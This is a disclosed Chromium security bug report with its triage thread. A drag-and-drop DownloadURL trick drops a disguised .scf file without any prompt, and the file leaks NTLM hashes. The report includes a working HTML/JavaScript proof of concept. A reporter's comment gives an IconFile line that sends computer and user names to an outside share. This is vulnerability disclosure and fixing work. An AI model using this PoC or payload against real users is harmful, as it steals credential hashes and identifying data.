# Security: Downloading .scf files possible with a drag and drop, stealing NTLM hashes

| Field | Value |
|-------|-------|
| **Issue ID** | [41486208](https://issues.chromium.org/issues/41486208) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>DataTransfer |
| **Platforms** | Mac, Windows |
| **Reporter** | ba...@gmail.com |
| **Assignee** | dr...@chromium.org |
| **Created** | 2023-12-21 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Downloading .scf files unknowingly without any prompt should not be possible (<https://crbug.com/1227995>)  

Using drag and drop to the explorer it is possible.  

This allows for stealing NTLM hashes (IconFile entry inside .scf file can point to a network share).  

File doesn't have to be opened by the user for that to happen.  

File named image.jpg.scf in the explorer will appear as image.jpg.

**VERSION**  

Chrome Version: 120.0.6099.130 (Official Build) (64-bit)  

Operating System: Windows 10 22H2 10.0.19045.3803

**REPRODUCTION CASE**

<div draggable="true" style="background-color: red; width: 200px; height: 200px">drag me to a folder to download</div><br>
<script>
function onDragStart(e){
const name = 'test.jpg.scf';
const url = `http://127.0.0.1/a.scf`; // full url to .scf file, same origin
const download\_url\_data = "application/octet-stream:" + name + ":" + url;
e.dataTransfer.setData("DownloadURL", download\_url\_data);
e.dataTransfer.effectAllowed = "copy";
}
document.querySelector('div').addEventListener("dragstart", onDragStart, false);
</script>

1. Put the poc.html and a.scf files on server.
2. Set proper url in the html code.
3. Open the PoC page
4. Drag the red square to desktop or to file explorer window.

**CREDIT INFORMATION**  

Reporter credit: Bartłomiej Wacko

## Attachments

- [poc.html](attachments/poc.html) (text/plain, 541 B)
- [a.scf](attachments/a.scf) (application/octet-stream, 100 B)
- [demo.gif](attachments/demo.gif) (image/gif, 193.5 KB)
- [safe browsing log.txt](attachments/safe browsing log.txt) (text/plain, 2.9 KB)
- [responder.gif](attachments/responder.gif) (image/gif, 554.7 KB)
- [leaking environment variables.gif](attachments/leaking environment variables.gif) (image/gif, 570.1 KB)

## Timeline

### [Deleted User] (2023-12-21)

[Empty comment from Monorail migration]

### bb...@google.com (2023-12-21)

To be clear here on what you are reporting:

1) You can point the scf file potentially to any file the server process has acess to, i.e. if the server has access to something on a network share (or anywhere else)  that the .ico file points to, the server will grab it and send it along.  Your "NTLM hashes" claim presumes that the web server has read access to something on a network share containing the hashes.  Do I have this correct? 

### bb...@google.com (2023-12-21)

This looks *very* similar to https://bugs.chromium.org/p/chromium/issues/detail?id=1227995 but triggered with drag and drop. 

I do not have a setup here to directly reproduce this, but I'm going to hand it over in any case hoping someone can take a quick look as 1227995 is in theory fixed. 

I am tenatively setting severity high on this one.

[Monorail components: Blink>Storage>FileSystem]

### [Deleted User] (2023-12-21)

[Empty comment from Monorail migration]

### ba...@gmail.com (2023-12-21)

> 1) You can point the scf file potentially to any file the server process has acess to, i.e. if the server has access to something on a network share (or anywhere else)  that the .ico file points to, the server will grab it and send it along.  Your "NTLM hashes" claim presumes that the web server has read access to something on a network share containing the hashes.  Do I have this correct?
After the file is downloaded operating system tries to render it's icon from the network share linked and authenticates itself with username and some hashes.

> This looks *very* similar to https://bugs.chromium.org/p/chromium/issues/detail?id=1227995 but triggered with drag and drop. 
Yes, I linked this report at the beginning of mine. This thread is why I assumed NTLM part doesn't need further explanation.
Just now I tried to actually grab the hashes and they do appear, at least in local network. Apparently you can try to crack them and recover user password. See gif.

### ay...@chromium.org (2023-12-21)

Assigning this to myself for now, and adding filesystem and data transfer folks for visibility. 

[Monorail components: Blink>DataTransfer]

### [Deleted User] (2023-12-21)

Setting milestone and target because of high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2023-12-21)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ay...@chromium.org (2023-12-21)

+dcheng@, looks like this utilizes DownloadURL which you might be most knowledgable about. Can you take a look?

Setting OS to Windows for scf type.


### es...@chromium.org (2023-12-25)

This looks like it uses DragDownloadFile (which, btw, is used on Mac and Windows only it seems, and I only had Linux handy to test with), which does pipe the download through the download manager and so hopefully the danger type is set by the safe browsing apparatus by the time we get here: https://source.chromium.org/chromium/chromium/src/+/main:content/browser/download/drag_download_file.cc;l=142;drc=8e78783dc1f7007bad46d657c9f332614e240fd8;bpv=1;bpt=1

SCF is notated as dangerous by SB: https://source.chromium.org/chromium/chromium/src/+/main:components/safe_browsing/content/resources/download_file_types.asciipb;l=2554-2566;drc=0f85cf3e303cd3a9705466c217b0799ca56dc36a Note that is one level worse than "exe" which is just `danger: ALLOW_ON_USER_GESTURE`

So if the above is correct and we are already analyzing these files, it would be low effort to simply disallow dragging of DANGEROUS files. SCF files can be *downloaded* to a user device but it does require an extra confirmation. It's not clear if we want to take the time to implement a similar extra confirmation step for dragging (DownloadURL), totally disable dragging of dangerous files (I'm sure some obscure use case will be broken by this), or something else (remove DownloadURL completely since it's obscure and not specced).

I doubt anyone will be in the office this week to look at this bug but it's been around roughly forever and it requires a lot of pretty explicit user interaction so I think it's ok if we target M122. I'll leave the severity alone for now because I don't know what criteria are used for that.

### ba...@gmail.com (2023-12-25)

 "it requires a lot of pretty explicit user interaction"
I agree with explicit as it's not something that can be done by accident. But it's just 1 to 2 gestures. Dragging and dropping is pretty standard way to quickly save an image or url shortcut - works the same way in Firefox or Safari. Of course I'm biased and it's not for me to say, just helping to paint the full picture.

Also I found another way to steal data:
If .scf contains environment variables like:
IconFile="//example.com/share/%computername%__%username%.ico"
When file is downloaded enviroment variables are leaked to the attacker on the internet. 

### es...@chromium.org (2024-01-02)

I tried to hack Chromium a bit to let me try this on Linux, but when I seemed to get it working, the download was successfully blocked.

Adding SafeBrowsing component given `safe browsing log.txt` in initial report.

[Monorail components: -Blink>Storage>FileSystem Services>Safebrowsing]

### dr...@chromium.org (2024-01-02)

I would expect Safe Browsing to be kicking in here, so maybe I'm the best person to investigate this. Let me try to reproduce this on Windows.

### dr...@chromium.org (2024-01-03)

I can reproduce the issue on Windows (from a skim of the drag and drop code, I think drag and drop downloads only work on Windows). Within the downloads code, the issue is https://source.chromium.org/chromium/chromium/src/+/main:chrome/browser/download/download_target_determiner.cc;drc=e5f8ff312fe542f39c7d34b4440f18d1500b15f9;l=1260. The comment there claims that we believe the user has validated the download path, but they clearly haven't in this case.

I'll need to audit the other cases that set a forced file path and see if we can differentiate the ones where we don't want this warning from the ones where we do.

### ps...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### dr...@chromium.org (2024-01-09)

A simple fix is up at https://crrev.com/c/5178792, but we may want to go a different direction.

I can reproduce this on M120, so moving FoundIn back. I also don't think this is a High severity vulnerability. Having the SCF file on disk leads to one network request to get the icon file, which can leak certain kinds of information (NTLM hashes and environment variables have been demonstrated), but not arbitrary information. The severity guidelines include "exposure of sensitive user information that an attacker can exfiltrate" as Medium severity, which describes this bug pretty well. I'm not sure why https://crbug.com/1227995 was High when it has the same impact.

### [Deleted User] (2024-01-09)

[Empty comment from Monorail migration]

### dr...@chromium.org (2024-01-11)

Well that's frustrating. GitWatcher didn't update the bug. This is fixed by https://crrev.com/c/5178792

### [Deleted User] (2024-01-12)

[Empty comment from Monorail migration]

### [Deleted User] (2024-01-12)

[Empty comment from Monorail migration]

### am...@google.com (2024-01-19)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2024-01-19)

Congratulations Bartłomiej! The Chrome VRP Panel has decided to award you $1,000 for this report of a user information disclosure. A member of the Google p2p-vrp finance team will be in touch with you soon to arrange payment. Thank you for your efforts and reporting this issue to us! 

### am...@google.com (2024-01-20)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-20)

This issue was migrated from crbug.com/chromium/1513639?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>DataTransfer, Services>Safebrowsing]
[Monorail components added to Component Tags custom field.]

### pe...@google.com (2024-02-04)

This is sufficiently serious that it should be merged to beta. But I can't  see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M122. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.


Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

Sheriffbot has determined this fix is necessary on milestone(s): [122].

Please answer the following questions so that we can safely process this merge request:
1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.


### am...@chromium.org (2024-02-04)

this fix landed on 122, removing merge approval
blintz merge rules are firing a little aggressively as an artifact migrating tooling to the new issue tracker -- an internal issue has been opened to investigate and tweak the logic of our automation to prevent this in the future b/323744575

### pe...@google.com (2024-04-19)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/41486208)*
